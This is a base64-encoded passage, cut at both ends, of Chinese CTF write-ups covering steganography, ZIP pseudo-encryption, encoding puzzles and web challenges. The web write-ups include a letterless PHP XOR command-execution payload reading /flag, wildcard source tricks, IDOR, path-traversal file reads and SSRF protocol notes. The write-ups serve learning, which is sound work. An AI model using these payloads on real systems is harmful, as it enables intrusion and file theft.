xyXG5cclxuKipcdTUxNzNcdTk1MkVcdTY1NTlcdThCQUQqKlx1RkYxQVx1NEUwMFx1NUYwMFx1NTlDQlx1NjIxMVx1NTNFQVx1NzUyOFx1NEU4NiBaV05KPTBcdTMwMDFaV0o9MVx1RkYwODEgYml0L1x1NUI1N1x1N0IyNlx1RkYwOVx1RkYwQzQ3IFx1NEY0RFx1NEU4Q1x1OEZEQlx1NTIzNlx1ODlFM1x1NEUwRFx1NTFGQVx1NEVGQlx1NEY1NVx1NEUxQ1x1ODk3Rlx1MzAwMlx1NkI2M1x1Nzg2RVx1N0I1NFx1Njg0OFx1NjYyRiA0IFx1NzlDRFx1NUI1N1x1N0IyNiBcdTAwRDcgMiBiaXRzL1x1NUI1N1x1N0IyNlx1RkYwQ1x1NjAzQlx1NjU3MFx1NjM2RSAxMjggXHU0RjREXHUzMDAyXHJcblxyXG4tLS1cclxuXHJcbiMjIEVYSUYgXHU1NkZFXHU3MjQ3XHU5NjkwXHU1MTk5XHJcblxyXG5cdTYyRkZcdTUyMzBcdTRFMDBcdTRFMkEgZmxhZy5qcGdcdUZGMENcdTg4NjhcdTk3NjJcdTRFMEFcdTY2MkZcdTdBN0FcdTc2N0RcdTU2RkVcdUZGMENcdTRGNDZcdTY1ODdcdTRFRjZcdTU5MjdcdTVDMEYgMjMxS0IgXHU2NjBFXHU2NjNFXHU0RTBEXHU1QkY5XHU1MkIyXHUzMDAyXHJcblxyXG5cdTUxNDhcdTc1MjggUHl0aG9uIFx1OEJGQiBFWElGIFx1NEZFMVx1NjA2Rlx1RkYxQVxyXG5cclxuXFxgXFxgXFxgcHl0aG9uXHJcbmZyb20gUElMIGltcG9ydCBJbWFnZVxyXG5pbWcgPSBJbWFnZS5vcGVuKCdmbGFnLmpwZycpXHJcbmV4aWYgPSBpbWcuZ2V0ZXhpZigpXHJcbmZvciB0YWdfaWQsIHZhbHVlIGluIGV4aWYuaXRlbXMoKTpcclxuICAgIHByaW50KHRhZ19pZCwgcmVwcih2YWx1ZSlbOjEwMF0pXHJcblxcYFxcYFxcYFxyXG5cclxuXHU1NzI4IEVYSUYgdGFnICoqNDAwOTIqKiBcdTkxQ0NcdTUzRDFcdTczQjBcdTk2OTBcdTg1Q0ZcdTY1NzBcdTYzNkVcdUZGMDFcclxuXHJcbiMjIyBcdTRFMDlcdTVDNDIgQmFzZTY0IFx1ODlFM1x1NzgwMVxyXG5cclxuXHU3QjJDXHU0RTAwXHU1QzQyIEJhc2U2NCBcdTg5RTNcdTc4MDEgXHUyMTkyIFx1OEZEOFx1NjYyRiBCYXNlNjQgXHU2ODNDXHU1RjBGXHJcblx1N0IyQ1x1NEU4Q1x1NUM0MiBCYXNlNjQgXHU4OUUzXHU3ODAxIFx1MjE5MiBcdThGRDhcdTY2MkYgQmFzZTY0IFx1NjgzQ1x1NUYwRlxyXG5cdTdCMkNcdTRFMDlcdTVDNDIgQmFzZTY0IFx1ODlFM1x1NzgwMSBcdTIxOTIgKipcXGBmbGFne1kwdV9BcjBfZGVjcnlwOV9NMnN0ZXJ9XFxgKipcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG5pbXBvcnQgYmFzZTY0LCBzdHJ1Y3RcclxuXHJcbiMgXHU0RUNFIEVYSUYgXHU2M0QwXHU1M0Q2XHU2NTcwXHU2MzZFXHJcbndpdGggb3BlbignZmxhZy5qcGcnLCAncmInKSBhcyBmOlxyXG4gICAgZGF0YSA9IGYucmVhZCgpXHJcblxyXG4jIFx1NjI3RSBFWElGIHRhZyA0MDA5Mlx1RkYwODB4OUM5Q1x1RkYwOVxyXG5pZHggPSBkYXRhLmZpbmQoYidcXFxceDljXFxcXHg5Y1xcXFx4MDBcXFxceDEwXFxcXHgwMFxcXFx4MDFcXFxceDAzXFxcXHgwMCcpXHJcbmlmIGlkeCA+PSAwOlxyXG4gICAgIyBcdTYzRDBcdTUzRDYgcmF3IGJ5dGVzXHJcbiAgICByYXdfbGVuID0gc3RydWN0LnVucGFjaygnPEknLCBkYXRhW2lkeCs0OmlkeCs4XSlbMF1cclxuICAgIHJhdyA9IGRhdGFbaWR4Kzg6aWR4KzgrcmF3X2xlbl1cclxuICAgICMgXHU0RTA5XHU1QzQyIEJhc2U2NCBcdTg5RTNcdTc4MDFcclxuICAgIGQxID0gYmFzZTY0LmI2NGRlY29kZShyYXcpXHJcbiAgICBkMiA9IGJhc2U2NC5iNjRkZWNvZGUoZDEpXHJcbiAgICBmbGFnID0gYmFzZTY0LmI2NGRlY29kZShkMikuZGVjb2RlKCd1dGYtOCcpXHJcbiAgICAjIGZsYWd7WTB1X0FyMF9kZWNyeXA5X00yc3Rlcn1cclxuXFxgXFxgXFxgXHJcblxyXG4qKlx1NjcwOVx1NjEwRlx1NjAxRFx1NzY4NFx1NTczMFx1NjVCOSoqXHVGRjFBXHU1NkZFXHU3MjQ3XHU4ODY4XHU5NzYyXHU2MjUzXHU1RjAwXHU1NDBFXHU2NjNFXHU3OTNBXHU3Njg0XHU2NjJGICoqXFxgQ1RGc2hvd3tcdThGRDlcdTkwRkRcdTgwRkRcdThCQTlcdTRGNjBcdTYyN0VcdTUyMzB9XFxgKipcdUZGMENcdTUxNzZcdTVCOUVcdTY2MkZcdThCRjFcdTk5NzUgZmxhZ1x1MzAwMlx1NzcxRlx1NkI2M1x1NzY4NCBmbGFnIFx1ODVDRlx1NTcyOCBFWElGIFx1NTE0M1x1NjU3MFx1NjM2RVx1OTFDQ1x1MzAwMlxyXG5cclxuLS0tXHJcblxyXG4jIyBaSVAgXHU1OTFBXHU5MUNEXHU1QkM2XHU3ODAxXHU3ODM0XHU4OUUzXHJcblxyXG5cdThGRDlcdTY2MkZcdTRFMDBcdTRFMkFcdTdFQ0ZcdTUxNzhcdTc2ODRcIlx1NEUwOVx1NkI2NVx1OTUwMVwiXHU1RjBGXHU1QkM2XHU3ODAxXHU5ODk4XHVGRjFBXHU0RTA5XHU1QzQyIFpJUCBcdTU5NTdcdTVBMDNcdUZGMENcdTZCQ0ZcdTVDNDJcdTkwRkRcdTY3MDlcdTRFMDBcdTRFMkEgS2V5XHVGRjBDXHU2NzAwXHU3RUM4XHU0RTA5XHU0RTJBIEtleSBcdTYyRkNcdTYyMTBcdTVCQzZcdTc4MDFcdTMwMDJcclxuXHJcbiMjIyBcdTdCMkNcdTRFMDBcdTVDNDJcdUZGMUFcdTU5MTZcdTVDNDIgWklQXHJcblxyXG5cdTc2RjRcdTYzQTVcdTg5RTNcdTUzOEJcdUZGMENcdTVGOTdcdTUyMzBcdTRFMDBcdTRFMkFcdTRGMkFcdTUyQTBcdTVCQzZcdTc2ODQgWklQXHVGRjA4XHU3QjJDXHU0RThDXHU1MTczLnppcFx1RkYwOVx1MzAwMlx1NzUyOCBXaW5SQVIgXHU2MjE2IDctWmlwIFx1NzY4NFwiXHU0RkVFXHU1OTBEXHU1MzhCXHU3RjI5XHU2NTg3XHU0RUY2XCJcdTUyOUZcdTgwRkRcdUZGMENcdTYyMTZcdTgwMDVcdTY1MzkgWklQIFx1NjU4N1x1NEVGNlx1NTkzNFx1NzY4NFx1NTJBMFx1NUJDNlx1NjgwN1x1NUZEN1x1NEY0RFx1NUMzMVx1ODBGRFx1ODlFM1x1NTM4Qlx1MzAwMlxyXG5cclxuXHU4OUUzXHU1MzhCXHU1NDBFXHU1Rjk3XHU1MjMwXHU0RTA5XHU0RTJBXHU2NTg3XHU0RUY2XHVGRjFBXHJcbi0gKiprZXkxLmRvY3gqKlx1RkYxQVx1NTE4NVx1NTQyQiAxMDggXHU0RTJBIGVtb2ppXHJcbi0gKiprZXkyLnR4dCoqXHVGRjFBXHU3OTNFXHU0RjFBXHU0RTNCXHU0RTQ5XHU2ODM4XHU1RkMzXHU0RUY3XHU1MDNDXHU4OUMyXHU1QjU3XHU3QjI2XHU0RTMyXHJcbi0gKiprZXkzLmRvY3gqKlx1RkYxQVx1OTZGNlx1NUJCRFx1OTY5MFx1NTE5OVxyXG4tICoqcmVhZG1lLnR4dCoqXHVGRjFBXHU2M0QwXHU3OTNBXCJcdTg5ODFcdTRFMDlcdTRFMkFrZXlcdTYyRkNcdTU3MjhcdTRFMDBcdThENzdcIlxyXG5cclxuIyMjIFx1N0IyQ1x1NEU4Q1x1NUM0Mlx1RkYxQUtleSAxIFx1MjAxNCBlbW9qaSBCYXNlMTAwIFx1ODlFM1x1NzgwMVxyXG5cclxua2V5MS5kb2N4IFx1OTFDQ1x1NjcwOSAxMDggXHU0RTJBIGVtb2ppXHVGRjBDXHU3NzBCXHU4RDc3XHU2NzY1XHU2QkVCXHU2NUUwXHU2MTBGXHU0RTQ5XHUzMDAyXHU0RjQ2XHU2NzA5XHU0RTAwXHU0RTJBXHU1M0VCICoqQmFzZTEwMCoqIFx1NzY4NFx1N0YxNlx1NzgwMVx1NjgwN1x1NTFDNlx1RkYwOFx1N0M3Qlx1NEYzQ1x1NEU4RSBCYXNlNjRcdUZGMDlcdUZGMENcdTc1MjggMTAwIFx1NEUyQSBlbW9qaSBcdTY2MjBcdTVDMDQgMC05OSBcdTc2ODRcdTY1NzBcdTVCNTdcdTMwMDJcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG4jIEJhc2UxMDAgXHU4OUUzXHU3ODAxXHU1MzlGXHU3NDA2XHJcbiMgMC02MiBcdTc2ODQgQVNDSUkgXHU1QjU3XHU3QjI2XHU3NkY0XHU2M0E1XHU2NjIwXHU1QzA0XHJcbiMgNjMtOTkgXHU3NTI4IGVtb2ppIFx1NjYyMFx1NUMwNFxyXG4jIDEwOCBlbW9qaSBcdTIxOTIgMTA4IFx1NUI1N1x1ODI4MiBcdTIxOTIgQmFzZTY0IFx1MjE5MiBcdTRFMkRcdTY1ODdcdTY1ODdcdTY3MkNcclxuXFxgXFxgXFxgXHJcblxyXG5cdTg5RTNcdTc4MDFcdTdFRDNcdTY3OUNcdUZGMUFcIlx1NzcwQlx1Njc2NVx1NEY2MFx1NURGMlx1N0VDRlx1NzdFNVx1OTA1M3ppcFx1NEYyQVx1NTJBMFx1NUJDNlx1NjAwRVx1NEU0OFx1NzgzNFx1ODlFM1x1NEU4Nlx1RkYwQ1x1OTBBM1x1NEU0OFx1NUMzMVx1N0VEOVx1NEY2MFx1NEUwMFx1NEUyQWtleToqKnpzbSoqXCJcclxuXHJcbioqS2V5IDEgPSB6c20qKlxyXG5cclxuIyMjIFx1N0IyQ1x1NEUwOVx1NUM0Mlx1RkYxQUtleSAyIFx1MjAxNCBcdTc5M0VcdTRGMUFcdTRFM0JcdTRFNDlcdTY4MzhcdTVGQzNcdTRFRjdcdTUwM0NcdTg5QzJcdTg5RTNcdTc4MDFcclxuXHJcbmtleTIudHh0IFx1NzY4NFx1NTE4NVx1NUJCOVx1NjYyRlx1RkYxQVwiXHU2Q0Q1XHU2Q0JCXHU2NTZDXHU0RTFBXHU2Q0Q1XHU2Q0JCXHU2NTZDXHU0RTFBXHU1MTZDXHU2QjYzXHU4MUVBXHU3NTMxXHU2Q0Q1XHU2Q0JCXHU1NDhDXHU4QzEwXCJcclxuXHJcblx1OEZEOVx1NjYyRiAxMiBcdTRFMkFcdTc5M0VcdTRGMUFcdTRFM0JcdTRFNDlcdTY4MzhcdTVGQzNcdTRFRjdcdTUwM0NcdTg5QzJcdThCQ0RcdThCRURcdUZGMENcdTZCQ0ZcdTRFMkFcdTY2MjBcdTVDMDRcdTRFMDBcdTRFMkFcdTUzNDFcdTUxNkRcdThGREJcdTUyMzZcdTUwM0NcdUZGMDgweDAtMHhCXHVGRjA5XHVGRjFBXHJcblxyXG5cXGBcXGBcXGBcclxuXHU1QkNDXHU1RjNBPTAgXHU2QzExXHU0RTNCPTEgXHU2NTg3XHU2NjBFPTIgXHU1NDhDXHU4QzEwPTNcclxuXHU4MUVBXHU3NTMxPTQgXHU1RTczXHU3QjQ5PTUgXHU1MTZDXHU2QjYzPTYgXHU2Q0Q1XHU2Q0JCPTdcclxuXHU3MjMxXHU1NkZEPTggXHU2NTZDXHU0RTFBPTkgXHU4QkRBXHU0RkUxPTEwIFx1NTNDQlx1NTU4ND0xMVxyXG5cXGBcXGBcXGBcclxuXHJcblx1NUMwNlx1NkJDRlx1NEUyQVx1OEJDRFx1NjYyMFx1NUMwNFx1NEUzQSBoZXggXHU2NTcwXHU1QjU3XHVGRjBDXHU2MkZDXHU2M0E1XHU4RDc3XHU2NzY1XHVGRjFBXHJcblxcYFxcYFxcYFxyXG5cdTZDRDVcdTZDQkIoNykgXHU2NTZDXHU0RTFBKDkpIFx1NkNENVx1NkNCQig3KSBcdTY1NkNcdTRFMUEoOSlcclxuXHU1MTZDXHU2QjYzKDYpIFx1ODFFQVx1NzUzMSg0KSBcdTZDRDVcdTZDQkIoNykgXHU1NDhDXHU4QzEwKDMpXHJcblx1MjE5MiAweDc5Nzk2NDczIFx1MjE5MiBBU0NJSVx1ODlFM1x1NzgwMSBcdTIxOTIgXCJ5eWRzXCJcclxuXFxgXFxgXFxgXHJcblxyXG4qKktleSAyID0geXlkcyoqXHJcblxyXG4jIyMgXHU3QjJDXHU1NkRCXHU1QzQyXHVGRjFBS2V5IDMgXHUyMDE0IFx1OTZGNlx1NUJCRFx1NUI1N1x1N0IyNlx1ODlFM1x1NzgwMVxyXG5cclxuXHU4OUMxXHU0RTBBXHU2NTg3XHU5NkY2XHU1QkJEXHU5NjkwXHU1MTk5XHU5MEU4XHU1MjA2XHUzMDAya2V5My5kb2N4IFx1NzY4NCBcXGBkYzpkZXNjcmlwdGlvblxcYCBcdTVCNTdcdTZCQjVcdTg1Q0ZcdTRFODYgNjQgXHU0RTJBXHU5NkY2XHU1QkJEXHU1QjU3XHU3QjI2XHVGRjBDXHU3NTI4IDQgXHU3OUNEXHU1QjU3XHU3QjI2IFx1MDBENyAyIGJpdHMgXHU4OUUzXHU3ODAxXHU1Rjk3XHU1MjMwXHVGRjFBXHJcblxyXG4qKktleSAzID0gNjY2KipcclxuXHJcbiMjIyBcdTY3MDBcdTdFQzhcdTVCQzZcdTc4MDFcclxuXHJcblx1NEUwOVx1NEUyQSBLZXkgXHU2MkZDXHU2M0E1XHVGRjFBKip6c20qKiArICoqeXlkcyoqICsgKio2NjYqKiA9ICoqXFxgenNteXlkczY2NlxcYCoqXHJcblxyXG5cdTc1MjhcdThGRDlcdTRFMkFcdTVCQzZcdTc4MDFcdTg5RTNcdTUzOEIgXFxgXHU3QjJDXHU0RTA5XHU1MTczLnppcFxcYFx1RkYwQ1x1NUY5N1x1NTIzMCBcXGBmbGFnLmpwZ1xcYFx1RkYwOEVYSUYgXHU5NjkwXHU1MTk5XHVGRjBDXHU4OUMxXHU0RTBBXHU2NTg3XHVGRjA5XHUzMDAyXHJcblxyXG5cXGBcXGBcXGBcclxuXHU2NzAwXHU3RUM4IGZsYWc6IGZsYWd7WTB1X0FyMF9kZWNyeXA5X00yc3Rlcn1cclxuXFxgXFxgXFxgXHJcblxyXG4tLS1cclxuXHJcbioqXHU4RTI5XHU1NzUxXHU2NTU5XHU4QkFEKipcdUZGMUFcclxuMS4gWklQIFx1NEYyQVx1NTJBMFx1NUJDNiA9IFx1NjUzOVx1NTJBMFx1NUJDNlx1NjgwN1x1NUZEN1x1NEY0RFx1RkYwQ1x1NUU3Nlx1OTc1RVx1NzcxRlx1NzY4NFx1NTJBMFx1NUJDNlxyXG4yLiBCYXNlMTAwIFx1NEUwRFx1NjYyRiBucG0gXHU3Njg0IGJhc2UxMDAgXHU1MzA1XHVGRjA4XHU1M0VBXHU2NjIwXHU1QzA0IDAtOTkgXHU2NTcwXHU1QjU3XHVGRjA5XHVGRjBDXHU4MDBDXHU2NjJGXHU1QjhDXHU2NTc0XHU3Njg0IEFTQ0lJLWVtb2ppIFx1NjYyMFx1NUMwNFxyXG4zLiBcdTRFMDlcdTRFMkEgS2V5IFx1NzZGNFx1NjNBNVx1NjJGQ1x1NjNBNVx1RkYwQ1x1NEUyRFx1OTVGNFx1NkNBMVx1NjcwOVx1NTIwNlx1OTY5NFx1N0IyNlxyXG40LiBcdTk2RjZcdTVCQkRcdTk2OTBcdTUxOTlcdTRFMERcdTg5ODFcdTUzRUFcdTc1MjggMiBcdTc5Q0RcdTVCNTdcdTdCMjZcdUZGMENcdTY4MDdcdTUxQzZcdTVFOTNcdTc1MjhcdTc2ODRcdTY2MkYgNCBcdTc5Q0QgXHUwMEQ3IDIgYml0c1xyXG5gXHJcbiAgfSxcclxuICBtaXNjOiB7XHJcbiAgICB0aXRsZTogJ1x1Njc0Mlx1OTg3OVx1NEUwRVx1N0VGQ1x1NTQwOCcsXHJcbiAgICBzdWJ0aXRsZTogJ01pc2NlbGxhbmVvdXMnLFxyXG4gICAgY29udGVudDogYFxyXG5cdTY3NDJcdTk4NzlcdTk4OThcdTVGODBcdTVGODBcdTY2MkZcdTY3MDBcdTY3MDlcdTYxMEZcdTYwMURcdTc2ODRcdUZGMENcdTU2RTBcdTRFM0FcdTRFQzBcdTRFNDhcdTkwRkRcdTY3MDlcdTUzRUZcdTgwRkRcdTgwMDNcdTUyMzBcdTMwMDJcdThGRDlcdTkxQ0NcdTYwM0JcdTdFRDNcdTRFODZcdTUxRTBcdTkwNTNcdTRFMERcdTU0MENcdTdDN0JcdTU3OEJcdTc2ODRcdTY3NDJcdTk4NzlcdTk4OThcdTMwMDJcclxuXHJcbiMjIENURkh1YiBcdTVGNjlcdTg2Q0JcclxuXHJcbkNURkh1YiBcdTVFNzNcdTUzRjBcdTY3MDlcdTRFMDBcdTRFMkFcdTk2OTBcdTg1Q0ZcdTc2ODRcdTVGNjlcdTg2Q0JcdTk4NzVcdTk3NjJcdUZGMENcdTRFMERcdTk3MDBcdTg5ODFcdTc2N0JcdTVGNTVcdTVDMzFcdTgwRkRcdTYyRkZcdTUyMzAgZmxhZ1x1RkYxQVxyXG5cclxuXFxgXFxgXFxgYmFzaFxyXG5jdXJsIGh0dHBzOi8vd3d3LmN0Zmh1Yi5jb20vc2tpbGwvZWFzdGVyX2VnZ1xyXG4jIGN0Zmh1YntiNjQ0ZDI3YTMwYjQ1MGIyZjE3MGM0ZjE5ZWYxZGQ4NWZiMWVmYzVkfVxyXG5cXGBcXGBcXGBcclxuXHJcbioqXHU2Q0U4XHU2MTBGKipcdUZGMUFcdThGRDlcdTY2MkZcdTVFNzNcdTUzRjBcdTc2ODRcdTVGNjlcdTg2Q0IgZmxhZ1x1RkYwQ1x1NEUwRFx1NjYyRlx1NjdEMFx1OTA1M1x1NTE3N1x1NEY1M1x1OTg5OFx1NzZFRVx1NzY4NCBmbGFnXHUzMDAyXHJcblxyXG4tLS1cclxuXHJcbiMjIFx1NjVFMFx1NUI1N1x1NkJDRFx1NjU3MFx1NUI1NyBSQ0UgXHU4RkRCXHU5NjM2XHJcblxyXG5cdThGRDlcdTY2MkZcdTk3NTJcdTVDOTEgQ1RGIFx1NEUyRFx1NzY4NCBlemNtZF81XHVGRjA4XHU0RTAwXHU4ODQwXHU5ODk4XHVGRjA5XHVGRjBDV0FGIFx1OEZDN1x1NkVFNFx1NEU4Nlx1NjI0MFx1NjcwOVx1NUI1N1x1NkJDRFx1NTQ4Q1x1NjU3MFx1NUI1N1x1RkYwQ1x1NEY0Nlx1NEZERFx1NzU1OVx1NEU4NiBcXGArXFxgXHUzMDAxXFxgLVxcYFx1MzAwMVxcYCpcXGBcdTMwMDFcXGAvXFxgXHUzMDAxXFxgXlxcYFx1RkYwOFhPUlx1RkYwOVx1MzAwMVxcYFxcYFxcYFx1MzAwMVxcYCRcXGBcXGBfXFxgIFx1N0I0OVx1N0IyNlx1NTNGN1x1MzAwMlxyXG5cclxuKipcdTUxNzNcdTk1MkVcdTYwMURcdThERUYqKlx1RkYxQVxyXG5cclxuMS4gKipcdTZCNjNcdTY1OUNcdTY3NjBcdTRFMERcdTgwRkRcdTc1MjgqKlx1RkYxRlx1OTBBM1x1NzUyOFx1NTNDRFx1NjU5Q1x1Njc2MFx1RkYwMVhPUiBcdTY3ODRcdTVFRkFcdTVCNTdcdTZCQ0RcclxuMi4gKipcXGBzeXN0ZW1cXGAgXHU0RTBEXHU4MEZEXHU3NkY0XHU2M0E1XHU1MTk5KipcdUZGMUZcdTc1MjhcdTUzRDhcdTkxQ0ZcdTUxRkRcdTY1NzAgXFxgJF8oKVxcYCBcdTUyQThcdTYwMDFcdThDMDNcdTc1MjhcclxuMy4gKipcdTkwMUFcdTkxNERcdTdCMjYqKlx1RkYxQVxcYC8/Pz8vPz8/Pz9cXGAgXHU1MzM5XHU5MTREIFxcYC9iaW4vY2F0XFxgXHJcblxyXG5cXGBcXGBcXGBwaHBcclxuJF89XCJfXCI7JCRfKCRfKTsgIC8vIFx1NTNEOFx1OTFDRlx1NTFGRFx1NjU3MFx1OEMwM1x1NzUyOFxyXG4vLyBcdTYyMTZcdTUyMjlcdTc1MjggWE9SIFx1Njc4NFx1OTAyMCBcInN5c3RlbVwiXHJcbiRfPVwiXCI7JF9fPShcIl9cIl5cIlxcXFxcIik7JF9fXz0oJF9fXlwiXFxcXFwiKTskJCRfKFwiY2F0IC9mbGFnXCIpO1xyXG5cXGBcXGBcXGBcclxuXHJcblx1NEY0Nlx1NjcwMFx1NURFN1x1NTk5OVx1NzY4NFx1ODlFM1x1NkNENVx1NjYyRlx1NzUyOCAqKkxpbnV4IFx1NzY4NCBcXGAuXFxgIFx1NTQ3RFx1NEVFNCoqXHVGRjA4c291cmNlIFx1NzY4NFx1NTIyQlx1NTQwRFx1RkYwOVx1RkYxQVxyXG5cclxuXFxgXFxgXFxgYmFzaFxyXG4uIC8/Pz8/Lj8/PyAyPiYxXHJcblxcYFxcYFxcYFxyXG5cclxuXFxgXFxgXFxgLlxcYCBcdTRFMERcdTY2MkZcdTVCNTdcdTZCQ0RcdUZGMENcXGAxXFxgXHUzMDAxXFxgMlxcYCBcdTRFNUZcdTRFMERcdTY2MkZcdTVCNTdcdTZCQ0RcdUZGMDhcXGAyPiYxXFxgIFx1OTFDRFx1NUI5QVx1NTQxMSBzdGRlcnJcdUZGMDlcdTMwMDJcXGAvPz8/Py4/Pz9cXGAgXHU3NTI4XHU5MDFBXHU5MTREXHU3QjI2XHU1MzM5XHU5MTREIFxcYC9mbGFnLnR4dFxcYFx1MzAwMlxyXG5cclxuKipcdTUxNzNcdTk1MkUqKlx1RkYxQVxcYHN5c3RlbSgpXFxgIFx1NTNFQVx1NjM1NVx1ODNCNyBzdGRvdXRcdUZGMENcdTgwMEMgc291cmNlIFx1NjI2N1x1ODg0Q1x1NjU4N1x1NEVGNlx1NTFGQVx1OTUxOVx1NjVGNlx1OEQ3MCBzdGRlcnJcdUZGMENcdTVGQzVcdTk4N0IgXFxgMj4mMVxcYCBcdTYyNERcdTgwRkRcdTc3MEJcdTUyMzAgZmxhZ1x1RkYwMVxyXG5cclxuLS0tXHJcblxyXG4jIyBcdTk2OTBcdTg1Q0ZcdTY1ODdcdTRFRjZcdTRFMEVcdTY1ODdcdTY4NjMgSURPUlxyXG5cclxuXHU4RkQ5XHU5MDUzXHU5ODk4XHU2NjJGIENURlNob3cgXHU3Njg0IGJhc2ljXzEyXHVGRjBDXHU3RjUxXHU5ODc1XHU0RTBBXHU1M0VBXHU2NjNFXHU3OTNBXCJiYXNpY18xMlwiXHU0RTAwXHU0RTJBXHU5NEZFXHU2M0E1XHVGRjBDXHU2Q0ExXHU2NzA5XHU1MTc2XHU0RUQ2XHU0RkUxXHU2MDZGXHUzMDAyXHJcblxyXG5cdTYyMTFcdTVDMURcdThCRDVcdTdFRDkgSUQgXHU1MkEwXHU0RTg2XHU0RTBEXHU1NDBDXHU1M0MyXHU2NTcwXHVGRjFBXHJcblxyXG5cXGBcXGBcXGBiYXNoXHJcbiMgXHU5RUQ4XHU4QkE0IElEPTE5MFx1RkYwQ1x1OEJENVx1OEJENSBJRD0xMjEgXHU3NzBCXHU3NzBCXHJcbmN1cmwgXCJodHRwOi8vdGFyZ2V0Lz9pZD0xMjFcIlxyXG4jIFx1NTNEMVx1NzNCMFx1NEU4Nlx1NEUwMFx1NEUyQVx1OTY5MFx1ODVDRlx1NjU4N1x1Njg2M1x1RkYwMVxyXG5cXGBcXGBcXGBcclxuXHJcbkZsYWcgXHU3NkY0XHU2M0E1XHU1MUZBXHU3M0IwXHU1NzI4XHU5NjkwXHU4NUNGXHU2NTg3XHU2ODYzXHU5MUNDXHUzMDAyXHU4RkQ5XHU3OUNEIElET1IgXHU1QzMxXHU2NjJGXHU5NzYwXHU3MzFDIElEIFx1NTAzQ1x1RkYwQ1x1NEUwRFx1OTcwMFx1ODk4MVx1NEVGQlx1NEY1NVx1NTkwRFx1Njc0Mlx1NjI4MFx1NURFN1x1MzAwMlxyXG5cclxuLS0tXHJcblxyXG4jIyBMRkkgXHU4REVGXHU1Rjg0XHU3QTdGXHU4RDhBXHJcblxyXG5cdTk3NTJcdTVDOTEgQ1RGIFx1NzY4NCBlemluZm9sZWFrIFx1OTg5OFx1RkYxQVx1OTg3NVx1OTc2Mlx1NjNEMFx1NEY5Qlx1NEUwMFx1NEUyQVx1NjU4N1x1NEVGNlx1NkQ0Rlx1ODlDOFx1NTI5Rlx1ODBGRFx1RkYwQ1x1NEY0Nlx1OTY1MFx1NTIzNlx1NEU4Nlx1NTNFRlx1OEJCRlx1OTVFRVx1NzY4NFx1OERFRlx1NUY4NFx1MzAwMlxyXG5cclxuXHU2N0U1XHU3NzBCXHU5ODc1XHU5NzYyXHU2RTkwXHU3ODAxXHU1M0QxXHU3M0IwXHU5NjUwXHU1MjM2XHU1NzI4IFxcYC9hcHAvXFxgIFx1NzZFRVx1NUY1NVx1NEUwQlx1RkYwQ1x1NEY0NiBmbGFnIFx1NTcyOFx1NjgzOVx1NzZFRVx1NUY1NSBcXGAvZmw0Zy50eHRcXGBcdUZGMUFcclxuXHJcblxcYFxcYFxcYGJhc2hcclxuIyBcdTUzNTVcdTVDNDIgLi4vIFx1NEUwRFx1NTkxRlx1RkYwQ1x1NUY5N1x1NUY4MFx1NEUwQVx1N0ZGQiA0IFx1NUM0MlxyXG5jdXJsIFwiaHR0cDovL3RhcmdldC8/ZmlsZT0uLi8uLi8uLi8uLi9mbDRnLnR4dFwiXHJcbiMgZmxhZ3suLi59XHJcblxcYFxcYFxcYFxyXG5cclxuKipcdTUxNzNcdTk1MkUqKlx1RkYxQUxGSSBcdThERUZcdTVGODRcdTdBN0ZcdThEOEFcdTc2ODRcdTZERjFcdTVFQTZcdTVGODhcdTkxQ0RcdTg5ODFcdTMwMDJcXGAuLi8uLi8uLi8uLi9cXGAgPSBcdTRFQ0UgXFxgL2FwcC9zb21lL3N1Yi9kaXIvXFxgIFx1NTZERVx1NTIzMFx1NjgzOVx1NzZFRVx1NUY1NVx1MzAwMlxyXG5cclxuLS0tXHJcblxyXG4jIyBTU1JGIFx1NTkxQVx1NzlDRFx1NTM0Rlx1OEJBRVx1N0VENVx1OEZDN1xyXG5cclxuXHU4RkQ5XHU5MDUzXHU5ODk4XHU3Njg0XHU2ODM4XHU1RkMzXHU2NjJGXHU0RTAwXHU0RTJBIFNTUkYgXHU2RjBGXHU2RDFFXHVGRjBDXHU5NzAwXHU4OTgxXHU1NDExIFxcYGZsYWcucGhwXFxgIFx1NTNEMVx1OTAwMSBQT1NUIFx1OEJGN1x1NkM0Mlx1RkYwQ1x1NEY0Nlx1ODk4MVx1NkM0MiBcXGAkX1BPU1RbXCJrZXlcIl0gPT0gJGtleVxcYFx1RkYwOFx1NUYzMVx1N0M3Qlx1NTc4Qlx1NkJENFx1OEY4M1x1RkYwOVx1MzAwMlxyXG5cclxuXHU1QzFEXHU4QkQ1XHU0RTg2XHU0RTA5XHU3OUNEXHU1MzRGXHU4QkFFXHVGRjFBXHJcblxyXG58IFx1NTM0Rlx1OEJBRSB8IFx1NzJCNlx1NjAwMSB8IFx1OEJGNFx1NjYwRSB8XHJcbnwtLS0tLS18LS0tLS0tfC0tLS0tLXxcclxufCBnb3BoZXI6Ly8gfCBcdTI3NEMgXHU4RDg1XHU2NUY2IHwgUEhQIGN1cmwgXHU2NzJBXHU3RjE2XHU4QkQxIGdvcGhlciBcdTY1MkZcdTYzMDEgfFxyXG58IGRpY3Q6Ly8gfCBcdTI3MDUgXHU4RkRFXHU5MDFBIHwgXHU4MEZEXHU2NTM2XHU1MjMwXHU1NENEXHU1RTk0XHU0RjQ2XHU2NUUwXHU2Q0Q1XHU2Nzg0XHU5MDIwXHU1QjhDXHU2NTc0IFBPU1QgfFxyXG58IGZpbGU6Ly8gfCBcdTI3MDUgXHU1M0VGXHU3NTI4IHwgXHU2MjEwXHU1MjlGXHU4QkZCXHU1M0Q2XHU0RTg2IGluZGV4LnBocCBcdTZFOTBcdTc4MDEgfFxyXG5cclxuKipcdTUxNzNcdTk1MkVcdTUzRDFcdTczQjAqKlx1RkYxQVxcYGZpbGU6Ly9cXGAgXHU1MzRGXHU4QkFFXHU1M0VGXHU0RUU1XHU3NkY0XHU2M0E1XHU4QkZCXHU1M0Q2XHU2NzBEXHU1MkExXHU3QUVGXHU3Njg0IFBIUCBcdTY1ODdcdTRFRjZcdTZFOTBcdTc4MDFcdUZGMENcdTYyRkZcdTUyMzBcdTRFRTNcdTc4MDFcdTkwM0JcdThGOTFcdTU0MEVcdTUxOERcdTYyN0VcdTdFRDVcdThGQzdcdTY1QjlcdTZDRDVcdTMwMDJcclxuXHJcbi0tLVxyXG5cclxuIyMgXHU1M0Q4XHU5MUNGXHU4OTg2XHU3NkQ2XHU0RTBFIFBIUCBcdTVGMzFcdTdDN0JcdTU3OEJcdThGREJcdTk2MzZcclxuXHJcbklTQ0MgXHU3Njg0XHU0RTAwXHU5MDUzIFdlYiBcdTk4OThcdUZGMUFc